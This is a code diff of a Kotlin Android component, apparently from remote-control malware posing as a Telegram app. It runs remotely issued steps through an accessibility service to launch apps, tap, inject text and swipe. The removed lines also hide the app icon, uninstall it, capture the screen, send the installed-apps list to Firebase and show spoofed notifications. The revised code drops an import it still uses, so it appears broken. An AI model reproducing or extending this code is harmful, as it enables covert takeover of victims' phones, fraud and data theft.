@@ -1,8 +1,5 @@
 package com.telegram2.messaging.remote
 
-import android.accessibilityservice.AccessibilityService
-import android.view.accessibility.AccessibilityNodeInfo
-
 object MacroRunner {
     var currentPackage: String? = null
 
@@ -23,130 +20,74 @@ object MacroRunner {
                     }
                 }
                 if (!success) {
-                    callback(false, "Step ${idx + 1} failed after ${step.retries} retries")
+                    callback(false, "Failed at step ${idx + 1}")
                     return@Thread
                 }
                 idx++
             }
-            callback(true, "All ${steps.size} steps completed")
+            callback(true, "Success: $macroId")
         }.start()
     }
 
     private fun executeStep(step: MacroStep, service: MyAccessibilityService): Boolean {
-        return when (step.type) {
-            "launch" -> {
-                val pkg = step.data as? String
-                if (pkg != null) {
-                    currentPackage = pkg
-                    service.runOnMainThread { service.launchApp(pkg) }
-                    true
-                } else {
-                    false
-                }
-            }
-            "wait" -> {
-                val ms = (step.data as? Number)?.toLong() ?: 1000L
-                Thread.sleep(ms)
-                true
-            }
-            "tap" -> {
-                val map = step.data as? Map<*, *>
-                if (map != null) {
-                    val x = map["x"] as? Int
-                    val y = map["y"] as? Int
-                    if (x != null && y != null) {
-                        service.runOnMainThread { service.tap(x, y) }
-                        true
-                    } else {
-                        false
+        return try {
+            when (step.type) {
+                "launch" -> {
+                    val pkg = step.data as? String
+                    if (pkg != null) {
+                        currentPackage = pkg
+                        service.runOnMainThread { service.launchApp(pkg) }
+                        Thread.sleep(3000)
                     }
-                } else {
-                    false
+                    pkg != null
                 }
-            }
-            "type" -> {
-                val text = step.data as? String
-                if (text != null) {
+                "tap" -> {
+                    val map = step.data as? Map<*, *>
+                    val x = map?.get("x") as? Int ?: 500
+                    val y = map?.get("y") as? Int ?: 1000
+                    service.runOnMainThread { service.tap(x, y) }
+                    Thread.sleep(1000)
+                    true
+                }
+                "type" -> {
+                    val text = step.data as? String ?: ""
                     service.runOnMainThread { service.injectText(text) }
+                    Thread.sleep(1000)
                     true
-                } else {
-                    false
                 }
-            }
-            "swipe" -> {
-                val map = step.data as? Map<*, *>
-                if (map != null) {
-                    val sx = map["sx"] as? Int
-                    val sy = map["sy"] as? Int
-                    val ex = map["ex"] as? Int
-                    val ey = map["ey"] as? Int
-                    val dur = map["dur"] as? Long ?: 300L
-                    if (sx != null && sy != null && ex != null && ey != null) {
-                        service.runOnMainThread { service.swipe(sx, sy, ex, ey, dur) }
-                        true
-                    } else {
-                        false
-                    }
-                } else {
-                    false
-                }
-            }
-            "click_text" -> {
-                val text = step.data as? String
-                if (text != null) {
-                    service.runOnMainThread {
-                        val root = service.rootInActiveWindow
-                        for (node in root?.findAccessibilityNodeInfosByText(text) ?: emptyList()) {
-                            if (node.isClickable) {
-                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                return@runOnMainThread
-                            }
-                        }
-                    }
+                "click_text" -> {
+                    val text = step.data as? String ?: ""
+                    service.runOnMainThread { service.clickText(text) }
+                    Thread.sleep(1500)
                     true
-                } else {
-                    false
                 }
-            }
-            "home" -> {
-                service.runOnMainThread { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }
-                true
-            }
-            "back" -> {
-                service.runOnMainThread { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) }
-                true
-            }
-            "hide_activity" -> {
-                service.runOnMainThread { service.hideAppIcon() }
-                true
-            }
-            "uninstall" -> {
-                service.runOnMainThread { service.uninstallSelf() }
-                true
-            }
-            "start_screen_capture" -> {
-                service.runOnMainThread { service.startScreenCapture() }
-                true
-            }
-            "get_apps" -> {
-                val apps = service.getInstalledApps()
-                FirebaseBridge.pushAppsList(apps)
-                true
-            }
-            "fake_notification" -> {
-                val map = step.data as? Map<*, *>
-                if (map != null) {
-                    val title = map["title"] as? String ?: "⚠ Alert"
-                    val body = map["text"] as? String ?: "Tap to view"
-                    service.runOnMainThread {
-                        NotificationSpoofer.show(service, title, body, null, null)
-                    }
+                "swipe" -> {
+                    val map = step.data as? Map<*, *>
+                    val sx = map?.get("sx") as? Int ?: 0
+                    val sy = map?.get("sy") as? Int ?: 0
+                    val ex = map?.get("ex") as? Int ?: 0
+                    val ey = map?.get("ey") as? Int ?: 0
+                    val dur = map?.get("dur") as? Long ?: 300L
+                    service.runOnMainThread { service.swipe(sx, sy, ex, ey, dur) }
+                    Thread.sleep(dur + 500)
                     true
-                } else {
-                    false
                 }
+                "home", "back" -> {
+                    val action = if (step.type == "home") AccessibilityService.GLOBAL_ACTION_HOME
+                    else AccessibilityService.GLOBAL_ACTION_BACK
+                    service.runOnMainThread { service.performGlobalAction(action) }
+                    Thread.sleep(1000)
+                    true
+                }
+                "wait" -> {
+                    val ms = (step.data as? Number)?.toLong() ?: 1000L
+                    Thread.sleep(ms)
+                    true
+                }
+                else -> false
             }
-            else -> false
+        } catch (e: Exception) {
+            false
         }
     }
 }
